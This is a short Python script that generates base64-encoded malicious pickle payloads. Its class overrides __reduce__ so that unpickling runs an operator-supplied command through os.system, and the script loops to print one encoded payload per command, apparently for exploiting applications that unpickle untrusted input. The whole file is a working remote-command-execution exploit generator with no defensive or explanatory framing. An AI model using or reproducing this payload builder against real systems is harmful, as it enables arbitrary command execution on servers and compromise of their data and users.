import base64
import pickle

class A:
    def __reduce__(self):
        import os
        cmd = input("cmd: ")
        return os.system, (cmd,)

if __name__ == "__main__":
    while True:
        pickled = pickle.dumps(A())
        contents = base64.urlsafe_b64encode(pickled).decode()
        print(contents)
